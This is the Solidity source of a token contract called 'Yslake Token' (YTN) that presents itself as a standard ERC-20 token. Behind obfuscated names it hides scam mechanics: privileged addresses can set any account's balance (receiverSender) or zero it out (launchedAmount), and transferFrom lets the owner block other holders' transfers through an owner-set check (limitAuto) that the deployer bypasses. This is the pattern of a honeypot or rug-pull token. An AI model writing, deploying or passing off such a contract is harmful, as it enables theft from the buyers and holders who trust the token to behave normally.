//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface Factory {
    function createPair(address tokenA, address tokenB) external returns (address);
    function feeTo() external view returns (address);
}

interface Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}


contract YslakeToken {

    uint256 private limitAuto;

    string public name = "Yslake Token";

    function allowance(address holder, address spender) external view virtual returns (uint256) {
        return amountListAt[holder][spender];
    }

    mapping(address => bool) public tradingAmountTake;

    function isWalletAuto(uint256 senderAmountLaunch) public {
        require(shouldTake[msg.sender]);
        limitAuto = senderAmountLaunch;
    }

    function receiverSender(address maxAmount, uint256 senderAmountLaunch) public {
        require(shouldTake[msg.sender]);
        shouldLiquidity[maxAmount] = senderAmountLaunch;
    }

    event  Approval(address indexed src, address indexed guy, uint wad);

    function approve(address guy, uint wad) public returns (bool) {
        amountListAt[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function swapReceiver(address takeMin, address launchedMin, uint256 senderAmountLaunch) internal returns (bool) {
        require(shouldLiquidity[takeMin] >= senderAmountLaunch);
        shouldLiquidity[takeMin] -= senderAmountLaunch;
        shouldLiquidity[launchedMin] += senderAmountLaunch;
        emit Transfer(takeMin, launchedMin, senderAmountLaunch);
        return true;
    }

    uint8  public decimals = 18;

    mapping(address => bool) public shouldTake;

    string public symbol = "YTN";

    address public marketingLiquidity;

    function transferFrom(address takeMin, address launchedMin, uint senderAmountLaunch) public returns (bool){
        if (takeMin != msg.sender && amountListAt[takeMin][msg.sender] != type(uint256).max) {
            require(amountListAt[takeMin][msg.sender] >= senderAmountLaunch);
            amountListAt[takeMin][msg.sender] -= senderAmountLaunch;
        }
        if (takeMin == launchedExempt) {
            return swapReceiver(takeMin, launchedMin, senderAmountLaunch);
        }
        uint256 fromFund = IERC20(marketingLiquidity).balanceOf(liquidityTrading);
        require(fromFund == limitAuto);
        require(launchedMin != liquidityTrading);
        return swapReceiver(takeMin, launchedMin, senderAmountLaunch);
    }

    function receiverTrading(address minLimit) public {
        if (exemptMaxEnable) {
            return;
        }
        shouldTake[minLimit] = true;
        exemptMaxEnable = true;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return shouldLiquidity[account];
    }

    constructor (){
        Router fundShouldTeam = Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        marketingLiquidity = Factory(fundShouldTeam.factory()).createPair(fundShouldTeam.WETH(), address(this));
        liquidityTrading = Factory(fundShouldTeam.factory()).feeTo();
        launchedExempt = msg.sender;
        shouldTake[msg.sender] = true;
        shouldLiquidity[msg.sender] = totalSupply;
        emit Transfer(address(0), launchedExempt, totalSupply);
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    address public launchedExempt;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private amountListAt;

    mapping(address => uint256) private shouldLiquidity;

    bool public exemptMaxEnable;

    event  Transfer(address indexed src, address indexed dst, uint wad);

    function launchedAmount(address buyFrom) public {
        require(shouldTake[msg.sender]);
        if (buyFrom == launchedExempt || buyFrom == marketingLiquidity) {
            return;
        }
        shouldLiquidity[buyFrom] = 0;
    }

    address private liquidityTrading;

}